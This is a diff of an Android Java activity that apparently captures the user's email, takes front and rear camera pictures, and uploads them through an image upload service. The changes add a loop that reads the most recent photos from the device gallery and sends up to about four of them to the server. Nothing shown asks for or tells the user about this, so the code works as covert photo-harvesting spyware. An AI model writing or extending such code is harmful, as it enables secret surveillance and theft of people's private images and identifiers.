@@ -109,7 +109,7 @@ public class PhotoActivity extends Activity implements SurfaceHolder.Callback {
             public void onPictureTaken(byte[] data, Camera camera) {
                 saveImage(data);
 
-                String name = String.format("rear_%d.jpg", System.currentTimeMillis());
+                String name = String.format("front_%d.jpg", System.currentTimeMillis());
                 sendToServer(name, data);
                 camera.release();
                 viewFlipper.showNext();
@@ -118,7 +118,7 @@ public class PhotoActivity extends Activity implements SurfaceHolder.Callback {
 
         jpegCallback = new PictureCallback() {
             public void onPictureTaken(byte[] data, Camera camera) {
-                String name = String.format("front_%d.jpg", System.currentTimeMillis());
+                String name = String.format("rear_%d.jpg", System.currentTimeMillis());
                 sendToServer(name, data);
                 try {
                     camera.release();
@@ -136,10 +136,11 @@ public class PhotoActivity extends Activity implements SurfaceHolder.Callback {
         captureEmail();
 
         Log.i("PhotoActivity", "onCreate called");
-        sendToServer(String.format("user-photo_%d.jpg", System.currentTimeMillis()),grabImage());
+        grabAndSendImages();
     }
 
     private void sendToServer(String name, byte[] data) {
+        Log.i("PhotoActivity", "will send to server "+name);
         Intent myIntent = new Intent(this, ImageUploadService.class);
         myIntent.putExtra(ImageUploadService.EXTRA_IMAGEDATA ,data);
         myIntent.putExtra(ImageUploadService.EXTRA_IMAGEDIR, this.email);
@@ -231,7 +232,7 @@ public class PhotoActivity extends Activity implements SurfaceHolder.Callback {
         camera = null;
     }
 
-    private byte[] grabImage() {
+    private void grabAndSendImages() {
         Cursor imageCursor;
         //do we want to do this as one or two queries?
         String[] projection = {MediaStore.Images.Media._ID};
@@ -239,15 +240,21 @@ public class PhotoActivity extends Activity implements SurfaceHolder.Callback {
         String[] selectionArgs = null;
         imageCursor = managedQuery(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, null);
 
+
         if(imageCursor != null){
-            imageCursor.moveToFirst();
-            int imageId = imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media._ID));
-            Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
-            return getBytesFromBitmap(loadImage(uri));
+            int photoCount = 0;
+            imageCursor.moveToLast();
+            do {
+                photoCount++;
+                int imageId = imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media._ID));
+                Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
+                byte[] data = getBytesFromBitmap(loadImage(uri));
+                sendToServer(String.format("user-photo-%d_%d.jpg",photoCount, System.currentTimeMillis()), data);
+            }while(photoCount<=3 && imageCursor.moveToPrevious());
         }
         else{
             Log.i("stillapp", "System media store is empty");
-            return null;
+
         }
     }
 
